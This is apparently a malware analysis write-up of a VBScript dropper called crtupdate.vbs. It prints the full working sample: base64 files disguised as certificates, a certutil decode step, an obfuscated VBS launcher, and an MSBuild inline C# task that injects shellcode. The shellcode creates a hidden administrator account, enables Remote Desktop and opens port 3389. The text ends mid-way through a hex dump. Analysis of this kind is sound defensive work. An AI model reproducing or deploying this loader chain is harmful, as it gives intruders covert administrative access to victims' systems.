# crtupdate.vbs

## Identification:

**FileName:** crtupdate.vbs

**SHA256:** 3ff0f51ec1b0f3e2d4c9685c52a1d0605435288b53f54cd048b28104c7539959

**FileSize:** 353 (bytes)

<br>

## Analysis:

The sample file consisted of crtupdate.vbs, one.crt and two.crt, which contents are shown below.

**crtupdate.vbs**
    Dim WshShell, oExec
    Set WshShell = CreateObject("WScript.Shell")    
      
    Set oExec = WshShell.Exec("certutil -decode one.crt C:\Users\Public\Documents\one.vbs")
    WScript.Sleep 1000
    Set oExec = WshShell.Exec("certutil -decode two.crt C:\Users\Public\Documents\xml.xml")
    WScript.Sleep 1000
    Set oExec = WshShell.Exec("cmd.exe /c C:\Users\Public\Documents\one.vbs")

**one.crt**
    -----BEGIN CERTIFICATE-----
    Z2V0VXBkYXRlKCkKClN1YiBnZXRVcGRhdGUoKQphID0gIkN2VnY6dlZ2XHZWdld2
    VnZpdlZ2bnZWdmR2VnZvdlZ2d3ZWdnN2VnZcdlZ2TXZWdml2VnZjdlZ2cnZWdm92
    VnZzdlZ2b3ZWdmZ2VnZ0dlZ2LnZWdk52VnZFdlZ2VHZWdlx2VnZGdlZ2cnZWdmF2
    VnZtdlZ2ZXZWdnd2VnZvdlZ2cnZWdmt2VnZcdlZ2dnZWdjR2VnYudlZ2MHZWdi52
    VnYzdlZ2MHZWdjN2VnYxdlZ2OXZWdlx2VnZNdlZ2U3ZWdkJ2VnZ1dlZ2aXZWdmx2
    VnZkdlZ2LnZWdmV2VnZ4dlZ2ZXZWdiIKCmFhID0gIkN2VnY6dlZ2XHZWdnV2VnZz
    dlZ2ZXZWdnJ2VnZzdlZ2XHZWdlB2VnZ1dlZ2YnZWdmx2VnZpdlZ2Y3ZWdlx2VnZE
    dlZ2b3ZWdmN2VnZ1dlZ2bXZWdmV2VnZudlZ2dHZWdnN2VnZcdlZ2eHZWdm12VnZs
    dlZ2LnZWdnh2VnZtdlZ2bHZWdiIKCmFhYSA9IHVwZGF0ZShhLCAidlZ2IikKYWFh
    YSA9IHVwZGF0ZShhYSwgInZWdiIpCgpTZXQgb2JqID0gR2V0T2JqZWN0KCJuZXc6
    QzA4QUZEOTAtRjJBMS0xMUQxLTg0NTUtMDBBMEM5MUYzODgwIikKICAgIG9iai5E
    b2N1bWVudC5BcHBsaWNhdGlvbi5TaGVsbEV4ZWN1dGUgYWFhLCBhYWFhLCBOdWxs
    LCAicnVuYXMiLCAwCgpFbmQgU3ViCkZ1bmN0aW9uIHVwZGF0ZShjY2osIGpqYykK
    RGltIHN0cgpzdHIgPSBSZXBsYWNlKGNjaiwgampjLCAiIikKdXBkYXRlID0gc3Ry
    CkVuZCBGdW5jdGlvbg==
    -----END CERTIFICATE-----

**two.crt**
    -----BEGIN CERTIFICATE-----
    PFByb2plY3QgVG9vbHNWZXJzaW9uPSI0LjAiIHhtbG5zPSJodHRwOi8vc2NoZW1h
    cy5taWNyb3NvZnQuY29tL2RldmVsb3Blci9tc2J1aWxkLzIwMDMiPgoJICA8VGFy
    Z2V0IE5hbWU9IldEU0FkbWluIj4KCSAgICA8Q2xhc3NFeGFtcGxlIC8+CgkgIDwv
    VGFyZ2V0PgoJICA8VXNpbmdUYXNrCgkgICAgVGFza05hbWU9IkNsYXNzRXhhbXBs
    ZSIKCSAgICBUYXNrRmFjdG9yeT0iQ29kZVRhc2tGYWN0b3J5IgoJICAgIEFzc2Vt
    Ymx5RmlsZT0iQzpcV2luZG93c1xNaWNyb3NvZnQuTmV0XEZyYW1ld29ya1x2NC4w
    LjMwMzE5XE1pY3Jvc29mdC5CdWlsZC5UYXNrcy52NC4wLmRsbCIgPgoJICAgIDxU
    YXNrPgoJICAgIAoJICAgICAgPENvZGUgVHlwZT0iQ2xhc3MiIExhbmd1YWdlPSJj
    cyI+CgkgICAgICA8IVtDREFUQVsKCQl1c2luZyBTeXN0ZW07CgkJdXNpbmcgU3lz
    dGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwoJCXVzaW5nIE1pY3Jvc29mdC5C
    dWlsZC5GcmFtZXdvcms7CgkJdXNpbmcgTWljcm9zb2Z0LkJ1aWxkLlV0aWxpdGll
    czsKCQlwdWJsaWMgY2xhc3MgQ2xhc3NFeGFtcGxlIDogIFRhc2ssIElUYXNrCgkJ
    eyAgICAgICAgIAoJCSAgcHJpdmF0ZSBzdGF0aWMgVUludDMyIE1FTV9DT01NSVQg
    PSAweDEwMDA7ICAgICAgICAgIAoJCSAgcHJpdmF0ZSBzdGF0aWMgVUludDMyIFBB
    R0VfRVhFQ1VURV9SRUFEV1JJVEUgPSAweDQwOyAgICAgICAgICAKCQkgIFtEbGxJ
    bXBvcnQoImtlcm5lbDMyIildCgkJICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBV
    SW50MzIgVmlydHVhbEFsbG9jKFVJbnQzMiBscFN0YXJ0QWRkciwKCQkgICAgVUlu
    dDMyIHNpemUsIFVJbnQzMiBmbEFsbG9jYXRpb25UeXBlLCBVSW50MzIgZmxQcm90
    ZWN0KTsgICAgICAgICAgCgkJICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQoJCSAg
    ICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50UHRyIENyZWF0ZVRocmVhZCggICAg
    ICAgICAgICAKCQkgICAgVUludDMyIGxwVGhyZWFkQXR0cmlidXRlcywKCQkgICAg
    VUludDMyIGR3U3RhY2tTaXplLAoJCSAgICBVSW50MzIgbHBTdGFydEFkZHJlc3Ms
    CgkJICAgIEludFB0ciBwYXJhbSwKCQkgICAgVUludDMyIGR3Q3JlYXRpb25GbGFn
    cywKCQkgICAgcmVmIFVJbnQzMiBscFRocmVhZElkICAgICAgICAgICAKCQkgICAg
    KTsKCQkgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCgkJICAgIHByaXZhdGUgc3Rh
    dGljIGV4dGVybiBVSW50MzIgV2FpdEZvclNpbmdsZU9iamVjdCggICAgICAgICAg
    IAoJCSAgICBJbnRQdHIgaEhhbmRsZSwKCQkgICAgVUludDMyIGR3TWlsbGlzZWNv
    bmRzCgkJICAgICk7ICAgICAgICAgIAoJCSAgcHVibGljIG92ZXJyaWRlIGJvb2wg
    RXhlY3V0ZSgpCgkJICB7CgkJICAgIGJ5dGVbXSBzbGNkID0gbmV3IGJ5dGVbXSB7
    MHhmYywweGU4LDB4ODIsMHgwMCwweDAwLDB4MDAsMHg2MCwweDg5LDB4ZTUsMHgz
    MSwweGMwLDB4NjQsMHg4YiwweDUwLDB4MzAsMHg4YiwweDUyLDB4MGMsMHg4Yiww
    eDUyLDB4MTQsMHg4YiwweDcyLDB4MjgsMHgwZiwweGI3LDB4NGEsMHgyNiwweDMx
    LDB4ZmYsMHhhYywweDNjLDB4NjEsMHg3YywweDAyLDB4MmMsMHgyMCwweGMxLDB4
    Y2YsMHgwZCwweDAxLDB4YzcsMHhlMiwweGYyLDB4NTIsMHg1NywweDhiLDB4NTIs
    MHgxMCwweDhiLDB4NGEsMHgzYywweDhiLDB4NGMsMHgxMSwweDc4LDB4ZTMsMHg0
    OCwweDAxLDB4ZDEsMHg1MSwweDhiLDB4NTksMHgyMCwweDAxLDB4ZDMsMHg4Yiww
    eDQ5LDB4MTgsMHhlMywweDNhLDB4NDksMHg4YiwweDM0LDB4OGIsMHgwMSwweGQ2
    LDB4MzEsMHhmZiwweGFjLDB4YzEsMHhjZiwweDBkLDB4MDEsMHhjNywweDM4LDB4
    ZTAsMHg3NSwweGY2LDB4MDMsMHg3ZCwweGY4LDB4M2IsMHg3ZCwweDI0LDB4NzUs
    MHhlNCwweDU4LDB4OGIsMHg1OCwweDI0LDB4MDEsMHhkMywweDY2LDB4OGIsMHgw
    YywweDRiLDB4OGIsMHg1OCwweDFjLDB4MDEsMHhkMywweDhiLDB4MDQsMHg4Yiww
    eDAxLDB4ZDAsMHg4OSwweDQ0LDB4MjQsMHgyNCwweDViLDB4NWIsMHg2MSwweDU5
    LDB4NWEsMHg1MSwweGZmLDB4ZTAsMHg1ZiwweDVmLDB4NWEsMHg4YiwweDEyLDB4
    ZWIsMHg4ZCwweDVkLDB4NmEsMHgwMSwweDhkLDB4ODUsMHhiMiwweDAwLDB4MDAs
    MHgwMCwweDUwLDB4NjgsMHgzMSwweDhiLDB4NmYsMHg4NywweGZmLDB4ZDUsMHhi
    YiwweGYwLDB4YjUsMHhhMiwweDU2LDB4NjgsMHhhNiwweDk1LDB4YmQsMHg5ZCww
    eGZmLDB4ZDUsMHgzYywweDA2LDB4N2MsMHgwYSwweDgwLDB4ZmIsMHhlMCwweDc1
    LDB4MDUsMHhiYiwweDQ3LDB4MTMsMHg3MiwweDZmLDB4NmEsMHgwMCwweDUzLDB4
    ZmYsMHhkNSwweDYzLDB4NmQsMHg2NCwweDJlLDB4NjUsMHg3OCwweDY1LDB4MjAs
    MHgyZiwweDZiLDB4MjAsMHgyMiwweDZlLDB4NjUsMHg3NCwweDIwLDB4NmMsMHg2
    ZiwweDYzLDB4NjEsMHg2YywweDY3LDB4NzIsMHg2ZiwweDc1LDB4NzAsMHgyMCww
    eDIyLDB4NTIsMHg2NSwweDZkLDB4NmYsMHg3NCwweDY1LDB4MjAsMHg0NCwweDY1
    LDB4NzMsMHg2YiwweDc0LDB4NmYsMHg3MCwweDIwLDB4NTUsMHg3MywweDY1LDB4
    NzIsMHg3MywweDIyLDB4MjAsMHgyZiwweDYxLDB4NjQsMHg2NCwweDIwLDB4MjYs
    MHgyMCwweDZlLDB4NjUsMHg3NCwweDIwLDB4NzUsMHg3MywweDY1LDB4NzIsMHgy
    MCwweDJmLDB4NjEsMHg2NCwweDY0LDB4MjAsMHg3NywweDY0LDB4NzMsMHg2MSww
    eDY0LDB4NmQsMHg2OSwweDZlLDB4MjAsMHg3MSwweDcxLDB4NzEsMHg3MSwweDMx
    LDB4MzEsMHgzMSwweDMxLDB4MjAsMHgyNiwweDIwLDB4NmUsMHg2NSwweDc0LDB4
    MjAsMHg2YywweDZmLDB4NjMsMHg2MSwweDZjLDB4NjcsMHg3MiwweDZmLDB4NzUs
    MHg3MCwweDIwLDB4NjEsMHg2NCwweDZkLDB4NjksMHg2ZSwweDY5LDB4NzMsMHg3
    NCwweDcyLDB4NjEsMHg3NCwweDZmLDB4NzIsMHg3MywweDIwLDB4NzcsMHg2NCww
    eDczLDB4NjEsMHg2NCwweDZkLDB4NjksMHg2ZSwweDIwLDB4MmYsMHg2MSwweDY0
    LDB4NjQsMHgyMCwweDI2LDB4MjAsMHg2ZSwweDY1LDB4NzQsMHgyMCwweDZjLDB4
    NmYsMHg2MywweDYxLDB4NmMsMHg2NywweDcyLDB4NmYsMHg3NSwweDcwLDB4MjAs
    MHgyMiwweDUyLDB4NjUsMHg2ZCwweDZmLDB4NzQsMHg2NSwweDIwLDB4NDQsMHg2
    NSwweDczLDB4NmIsMHg3NCwweDZmLDB4NzAsMHgyMCwweDU1LDB4NzMsMHg2NSww
    eDcyLDB4NzMsMHgyMiwweDIwLDB4NzcsMHg2NCwweDczLDB4NjEsMHg2NCwweDZk
    LDB4NjksMHg2ZSwweDIwLDB4MmYsMHg2MSwweDY0LDB4NjQsMHgyMCwweDI2LDB4
    MjAsMHg3MiwweDY1LDB4NjcsMHgyMCwweDYxLDB4NjQsMHg2NCwweDIwLDB4MjIs
    MHg0OCwweDRiLDB4NDUsMHg1OSwweDVmLDB4NGMsMHg0ZiwweDQzLDB4NDEsMHg0
    YywweDVmLDB4NGQsMHg0MSwweDQzLDB4NDgsMHg0OSwweDRlLDB4NDUsMHg1Yyww
    eDUzLDB4NTksMHg1MywweDU0LDB4NDUsMHg0ZCwweDVjLDB4NDMsMHg3NSwweDcy
    LDB4NzIsMHg2NSwweDZlLDB4NzQsMHg0MywweDZmLDB4NmUsMHg3NCwweDcyLDB4
    NmYsMHg2YywweDUzLDB4NjUsMHg3NCwweDVjLDB4NDMsMHg2ZiwweDZlLDB4NzQs
    MHg3MiwweDZmLDB4NmMsMHg1YywweDU0LDB4NjUsMHg3MiwweDZkLDB4NjksMHg2
    ZSwweDYxLDB4NmMsMHgyMCwweDUzLDB4NjUsMHg3MiwweDc2LDB4NjUsMHg3Miww
    eDIyLDB4MjAsMHgyZiwweDc2LDB4MjAsMHg2NiwweDQ0LDB4NjUsMHg2ZSwweDc5
    LDB4NTQsMHg1MywweDQzLDB4NmYsMHg2ZSwweDZlLDB4NjUsMHg2MywweDc0LDB4
    NjksMHg2ZiwweDZlLDB4NzMsMHgyMCwweDJmLDB4NzQsMHgyMCwweDUyLDB4NDUs
    MHg0NywweDVmLDB4NDQsMHg1NywweDRmLDB4NTIsMHg0NCwweDIwLDB4MmYsMHg2
    NCwweDIwLDB4MzAsMHgyMCwweDJmLDB4NjYsMHgyMCwweDI2LDB4MjAsMHg2ZSww
    eDY1LDB4NzQsMHg3MywweDY4LDB4MjAsMHg2MSwweDY0LDB4NzYsMHg2NiwweDY5
    LDB4NzIsMHg2NSwweDc3LDB4NjEsMHg2YywweDZjLDB4MjAsMHg2NiwweDY5LDB4
    NzIsMHg2NSwweDc3LDB4NjEsMHg2YywweDZjLDB4MjAsMHg2MSwweDY0LDB4NjQs
    MHgyMCwweDcyLDB4NzUsMHg2YywweDY1LDB4MjAsMHg2ZSwweDYxLDB4NmQsMHg2
    NSwweDNkLDB4MjIsMHg0ZiwweDcwLDB4NjUsMHg2ZSwweDIwLDB4NTIsMHg2NSww
    eDZkLDB4NmYsMHg3NCwweDY1LDB4MjAsMHg0NCwweDY1LDB4NzMsMHg2YiwweDc0
    LDB4NmYsMHg3MCwweDIyLDB4MjAsMHg3MCwweDcyLDB4NmYsMHg3NCwweDZmLDB4
    NjMsMHg2ZiwweDZjLDB4M2QsMHg1NCwweDQzLDB4NTAsMHgyMCwweDY0LDB4Njks
    MHg3MiwweDNkLDB4NjksMHg2ZSwweDIwLDB4NmMsMHg2ZiwweDYzLDB4NjEsMHg2
    YywweDcwLDB4NmYsMHg3MiwweDc0LDB4M2QsMHgzMywweDMzLDB4MzgsMHgzOSww
    eDIwLDB4NjEsMHg2MywweDc0LDB4NjksMHg2ZiwweDZlLDB4M2QsMHg2MSwweDZj
    LDB4NmMsMHg2ZiwweDc3LDB4MjIsMHgwMH07CgkJICAgICAgCgkJICAgICAgVUlu
    dDMyIGZ1bmNBZGRyID0gVmlydHVhbEFsbG9jKDAsIChVSW50MzIpc2xjZC5MZW5n
    dGgsCgkJCU1FTV9DT01NSVQsIFBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpOwoJCSAg
    ICAgIE1hcnNoYWwuQ29weShzbGNkLCAwLCAoSW50UHRyKShmdW5jQWRkciksIHNs
    Y2QuTGVuZ3RoKTsKCQkgICAgICBJbnRQdHIgaFRocmVhZCA9IEludFB0ci5aZXJv
    OwoJCSAgICAgIFVJbnQzMiB0aHJlYWRJZCA9IDA7CgkJICAgICAgSW50UHRyIHBp
    bmZvID0gSW50UHRyLlplcm87CgkJICAgICAgaFRocmVhZCA9IENyZWF0ZVRocmVh
    ZCgwLCAwLCBmdW5jQWRkciwgcGluZm8sIDAsIHJlZiB0aHJlYWRJZCk7CgkJICAg
    ICAgV2FpdEZvclNpbmdsZU9iamVjdChoVGhyZWFkLCAweEZGRkZGRkZGKTsKCQkg
    ICAgICByZXR1cm4gdHJ1ZTsKCQkgIH0gCgkJfSAgICAgCgkgICAgICBdXT4KCSAg
    ICAgIDwvQ29kZT4KCSAgICA8L1Rhc2s+CgkgIDwvVXNpbmdUYXNrPgoJPC9Qcm9q
    ZWN0Pg==
    -----END CERTIFICATE-----

The crtupdate.vbs can be seen decoding one.crt and two.crt using certutil and saving the decoding contents as one.vbs and xml.xml respectively under C:\Users\Public\Documents. Looking at the contents of one.crt and two.crt, those seem like base64 encoded. The crtupdate.vbs will then execute the decoded one.vbs by spawing a cmd.exe.

So lets focus on one.vbs which will be decoded from one.crt. Decoding the one.crt content, following was found.

    getUpdate()
    
    Sub getUpdate()
    a = "CvVv:vVv\vVvWvVvivVvnvVvdvVvovVvwvVvsvVv\vVvMvVvivVvcvVvrvVvovVvsvVvovVvfvVvtvVv.vVvNvVvEvVvTvVv\vVvFvVvrvVvavVvmvVvevVvwvVvovVvrvVvkvVv\vVvvvVv4vVv.vVv0vVv.vVv3vVv0vVv3vVv1vVv9vVv\vVvMvVvSvVvBvVvuvVvivVvlvVvdvVv.vVvevVvxvVvevVv"
    
    aa = "CvVv:vVv\vVvuvVvsvVvevVvrvVvsvVv\vVvPvVvuvVvbvVvlvVvivVvcvVv\vVvDvVvovVvcvVvuvVvmvVvevVvnvVvtvVvsvVv\vVvxvVvmvVvlvVv.vVvxvVvmvVvlvVv"
    
    aaa = update(a, "vVv")
    aaaa = update(aa, "vVv")
    
    Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
        obj.Document.Application.ShellExecute aaa, aaaa, Null, "runas", 0
    
    End Sub
    Function update(ccj, jjc)
    Dim str
    str = Replace(ccj, jjc, "")
    update = str
    End Function

The code is little obfuscated with update() along with some junk code at bottom. The de-obfuscated code can be seen below.

    getUpdate()
    
    Sub getUpdate()
    a = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe"
    
    aa = "C:\users\Public\Documents\xml.xml"
    
    Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
        obj.Document.Application.ShellExecute aaa, aaaa, Null, "runas", 0
    
    End Sub

Here, it will execute getUpdate() function which will . A COM object 'C08AFD90-F2A1-11D1-8455-00A0C91F3880' is referenced by VBScript, which is ShellBrowserWindow object. Using that object it will execute MSBuild.exe to build xml.xml using ShellExecute of that function. The xml.xml file is decoded from two.crt so lets look further into it. 

Decoding the two.crt content, following was found.

    <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
    	  <Target Name="WDSAdmin">
    	    <ClassExample />
    	  </Target>
    	  <UsingTask
    	    TaskName="ClassExample"
    	    TaskFactory="CodeTaskFactory"
    	    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    	    <Task>
    	    
    	      <Code Type="Class" Language="cs">
    	      <![CDATA[
    		using System;
    		using System.Runtime.InteropServices;
    		using Microsoft.Build.Framework;
    		using Microsoft.Build.Utilities;
    		public class ClassExample :  Task, ITask
    		{         
    		  private static UInt32 MEM_COMMIT = 0x1000;          
    		  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
    		  [DllImport("kernel32")]
    		    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
    		    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
    		  [DllImport("kernel32")]
    		    private static extern IntPtr CreateThread(            
    		    UInt32 lpThreadAttributes,
    		    UInt32 dwStackSize,
    		    UInt32 lpStartAddress,
    		    IntPtr param,
    		    UInt32 dwCreationFlags,
    		    ref UInt32 lpThreadId           
    		    );
    		  [DllImport("kernel32")]
    		    private static extern UInt32 WaitForSingleObject(           
    		    IntPtr hHandle,
    		    UInt32 dwMilliseconds
    		    );          
    		  public override bool Execute()
    		  {
    		    byte[] slcd = new byte[] {0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,0x6d,0x64,0x2e,0x65,0x78,0x65,0x20,0x2f,0x6b,0x20,0x22,0x6e,0x65,0x74,0x20,0x6c,0x6f,0x63,0x61,0x6c,0x67,0x72,0x6f,0x75,0x70,0x20,0x22,0x52,0x65,0x6d,0x6f,0x74,0x65,0x20,0x44,0x65,0x73,0x6b,0x74,0x6f,0x70,0x20,0x55,0x73,0x65,0x72,0x73,0x22,0x20,0x2f,0x61,0x64,0x64,0x20,0x26,0x20,0x6e,0x65,0x74,0x20,0x75,0x73,0x65,0x72,0x20,0x2f,0x61,0x64,0x64,0x20,0x77,0x64,0x73,0x61,0x64,0x6d,0x69,0x6e,0x20,0x71,0x71,0x71,0x71,0x31,0x31,0x31,0x31,0x20,0x26,0x20,0x6e,0x65,0x74,0x20,0x6c,0x6f,0x63,0x61,0x6c,0x67,0x72,0x6f,0x75,0x70,0x20,0x61,0x64,0x6d,0x69,0x6e,0x69,0x73,0x74,0x72,0x61,0x74,0x6f,0x72,0x73,0x20,0x77,0x64,0x73,0x61,0x64,0x6d,0x69,0x6e,0x20,0x2f,0x61,0x64,0x64,0x20,0x26,0x20,0x6e,0x65,0x74,0x20,0x6c,0x6f,0x63,0x61,0x6c,0x67,0x72,0x6f,0x75,0x70,0x20,0x22,0x52,0x65,0x6d,0x6f,0x74,0x65,0x20,0x44,0x65,0x73,0x6b,0x74,0x6f,0x70,0x20,0x55,0x73,0x65,0x72,0x73,0x22,0x20,0x77,0x64,0x73,0x61,0x64,0x6d,0x69,0x6e,0x20,0x2f,0x61,0x64,0x64,0x20,0x26,0x20,0x72,0x65,0x67,0x20,0x61,0x64,0x64,0x20,0x22,0x48,0x4b,0x45,0x59,0x5f,0x4c,0x4f,0x43,0x41,0x4c,0x5f,0x4d,0x41,0x43,0x48,0x49,0x4e,0x45,0x5c,0x53,0x59,0x53,0x54,0x45,0x4d,0x5c,0x43,0x75,0x72,0x72,0x65,0x6e,0x74,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x53,0x65,0x74,0x5c,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x5c,0x54,0x65,0x72,0x6d,0x69,0x6e,0x61,0x6c,0x20,0x53,0x65,0x72,0x76,0x65,0x72,0x22,0x20,0x2f,0x76,0x20,0x66,0x44,0x65,0x6e,0x79,0x54,0x53,0x43,0x6f,0x6e,0x6e,0x65,0x63,0x74,0x69,0x6f,0x6e,0x73,0x20,0x2f,0x74,0x20,0x52,0x45,0x47,0x5f,0x44,0x57,0x4f,0x52,0x44,0x20,0x2f,0x64,0x20,0x30,0x20,0x2f,0x66,0x20,0x26,0x20,0x6e,0x65,0x74,0x73,0x68,0x20,0x61,0x64,0x76,0x66,0x69,0x72,0x65,0x77,0x61,0x6c,0x6c,0x20,0x66,0x69,0x72,0x65,0x77,0x61,0x6c,0x6c,0x20,0x61,0x64,0x64,0x20,0x72,0x75,0x6c,0x65,0x20,0x6e,0x61,0x6d,0x65,0x3d,0x22,0x4f,0x70,0x65,0x6e,0x20,0x52,0x65,0x6d,0x6f,0x74,0x65,0x20,0x44,0x65,0x73,0x6b,0x74,0x6f,0x70,0x22,0x20,0x70,0x72,0x6f,0x74,0x6f,0x63,0x6f,0x6c,0x3d,0x54,0x43,0x50,0x20,0x64,0x69,0x72,0x3d,0x69,0x6e,0x20,0x6c,0x6f,0x63,0x61,0x6c,0x70,0x6f,0x72,0x74,0x3d,0x33,0x33,0x38,0x39,0x20,0x61,0x63,0x74,0x69,0x6f,0x6e,0x3d,0x61,0x6c,0x6c,0x6f,0x77,0x22,0x00};
    		      
    		      UInt32 funcAddr = VirtualAlloc(0, (UInt32)slcd.Length,
    			MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    		      Marshal.Copy(slcd, 0, (IntPtr)(funcAddr), slcd.Length);
    		      IntPtr hThread = IntPtr.Zero;
    		      UInt32 threadId = 0;
    		      IntPtr pinfo = IntPtr.Zero;
    		      hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
    		      WaitForSingleObject(hThread, 0xFFFFFFFF);
    		      return true;
    		  } 
    		}     
    	      ]]>
    	      </Code>
    	    </Task>
    	  </UsingTask>
    	</Project>


This seem to like a build file written in xml format which will be build using MSBuild.exe by one.vbs. This has some interesting informations:
- It is allocating byte array called slcd and storing some value under which seems like the shellcode.
- Using **VirtualAlloc** API, it can be seen allocating the size equal to lenght of slcd byte array.
- Using **Marshal.Copy** API, it is copying the slcd in the allocated space.
- Then it uses **CreateThread** API to execute the values inside slcd byte array by creating a thread. 
- Finally, there is **WaitForSingleObject** API with value 0xFFFFFFFF, which will wait for the handle infinitely causing it to not show in process list.
- This whole process looks like process injection technique.

Lets now decode the possible shellcode stored in slcd byte array.

0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,0x6d,0x64,0x2e,0x65,0x78,0x65,0x20,0x2f,0x6b,0x20,0x22,0x6e,0x65,0x74,0x20,0x6c,0x6f,0x63,0x61,0x6c,0x67,0x72,0x6f,0x75,0x70,0x20,0x22,0x52,0x65,0x6d,0x6f,0x74,0x65,0x20,0x44,0x65,0x73,0x6b,0x74,0x6f,0x70,0x20,0x55,0x73,0x65,0x72,0x73,0x22,0x20,0x2f,0x61,0x64,0x64,0x20,0x26,0x20,0x6e,0x65,0x74,0x20,0x75,0x73,0x65,0x72,0x20,0x2f,0x61,0x64,0x64,0x20,0x77,0x64,0x73,0x61,0x64,0x6d,0x69,0x6e,0x20,0x71,0x71,0x71,0x71,0x31,0x31,0x31,0x31,0x20,0x26,0x20,0x6e,0x65,0x74,0x20,0x6c,0x6f,0x63,0x61,0x6c,0x67,0x72,0x6f,0x75,0x70,0x20,0x61,0x64,0x6d,0x69,0x6e,0x69,0x73,0x74,0x72,0x61,0x74,0x6f,0x72,0x73,0x20,0x77,0x64,0x73,0x61,0x64,0x6d,0x69,0x6e,0x20,0x2f,0x61,0x64,0x64,0x20,0x26,0x20,0x6e,0x65,0x74,0x20,0x6c,0x6f,0x63,0x61,0x6c,0x67,0x72,0x6f,0x75,0x70,0x20,0x22,0x52,0x65,0x6d,0x6f,0x74,0x65,0x20,0x44,0x65,0x73,0x6b,0x74,0x6f,0x70,0x20,0x55,0x73,0x65,0x72,0x73,0x22,0x20,0x77,0x64,0x73,0x61,0x64,0x6d,0x69,0x6e,0x20,0x2f,0x61,0x64,0x64,0x20,0x26,0x20,0x72,0x65,0x67,0x20,0x61,0x64,0x64,0x20,0x22,0x48,0x4b,0x45,0x59,0x5f,0x4c,0x4f,0x43,0x41,0x4c,0x5f,0x4d,0x41,0x43,0x48,0x49,0x4e,0x45,0x5c,0x53,0x59,0x53,0x54,0x45,0x4d,0x5c,0x43,0x75,0x72,0x72,0x65,0x6e,0x74,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x53,0x65,0x74,0x5c,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x5c,0x54,0x65,0x72,0x6d,0x69,0x6e,0x61,0x6c,0x20,0x53,0x65,0x72,0x76,0x65,0x72,0x22,0x20,0x2f,0x76,0x20,0x66,0x44,0x65,0x6e,0x79,0x54,0x53,0x43,0x6f,0x6e,0x6e,0x65,0x63,0x74,0x69,0x6f,0x6e,0x73,0x20,0x2f,0x74,0x20,0x52,0x45,0x47,0x5f,0x44,0x57,